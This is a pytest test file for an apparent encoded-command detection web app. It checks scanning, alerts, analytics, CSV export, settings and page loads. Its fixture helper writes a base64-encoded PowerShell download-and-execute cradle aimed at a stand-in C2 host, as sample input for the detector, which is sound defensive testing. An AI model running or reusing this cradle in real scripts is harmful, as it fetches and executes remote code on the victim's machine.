import base64
import os
import shutil
import tempfile


def _make_suspicious_file():
    tmpdir = tempfile.mkdtemp()
    payload = "IEX (New-Object Net.WebClient).DownloadString('http://c2.test/payload')"
    encoded = base64.b64encode(payload.encode("utf-16le")).decode("ascii")
    target = os.path.join(tmpdir, "suspicious.ps1")
    with open(target, "w") as f:
        f.write(f"powershell -EncodedCommand {encoded}\n")
    return tmpdir, target


def test_full_scan_alert_incident_workflow(registered_client):
    tmpdir, target = _make_suspicious_file()
    try:
        # Run a real scan against a real temp file containing a real
        # base64-encoded suspicious payload.
        resp = registered_client.post("/scan/run", data={"target_path": target}, follow_redirects=True)
        assert resp.status_code == 200
        assert b"Scan complete" in resp.data

        # Logs page should show at least one scan.
        resp = registered_client.get("/logs")
        assert target.encode() in resp.data

        # Alerts page should load (a critical ECD-001 finding should generate
        # an alert given the default "medium" alert threshold).
        resp = registered_client.get("/alerts")
        assert resp.status_code == 200

        # Analytics JSON endpoint returns real aggregated data.
        resp = registered_client.get("/analytics/data")
        assert resp.status_code == 200
        assert resp.is_json
        data = resp.get_json()
        assert "critical" in data["severity_breakdown"]

        # Reports CSV export works.
        resp = registered_client.get("/reports/export.csv")
        assert resp.status_code == 200
        assert resp.headers["Content-Type"].startswith("text/csv")
        assert b"ECD-001" in resp.data
    finally:
        shutil.rmtree(tmpdir)


def test_settings_page_round_trip(registered_client):
    resp = registered_client.post("/settings", data={
        "default_scan_path": "/tmp",
        "scan_depth_limit": "3",
        "exclude_paths": "/proc,/sys",
        "alert_on_severity": "high",
    }, follow_redirects=True)
    assert b"Settings saved" in resp.data

    resp = registered_client.get("/settings")
    assert b"/tmp" in resp.data


def test_all_nav_pages_load(registered_client):
    for path in ["/", "/logs", "/alerts", "/incidents", "/analytics", "/reports", "/settings"]:
        resp = registered_client.get(path)
        assert resp.status_code == 200, f"{path} failed with {resp.status_code}"


def test_scan_detail_page_shows_decoded_preview(registered_client):
    tmpdir, target = _make_suspicious_file()
    try:
        registered_client.post("/scan/run", data={"target_path": target}, follow_redirects=True)
        resp = registered_client.get("/logs")
        assert resp.status_code == 200
        # Find the scan id link and open the detail page.
        resp_detail = registered_client.get("/logs/1")
        assert resp_detail.status_code == 200
        assert b"ECD-001" in resp_detail.data
    finally:
        shutil.rmtree(tmpdir)


def test_404_page(registered_client):
    resp = registered_client.get("/this-page-does-not-exist")
    assert resp.status_code == 404
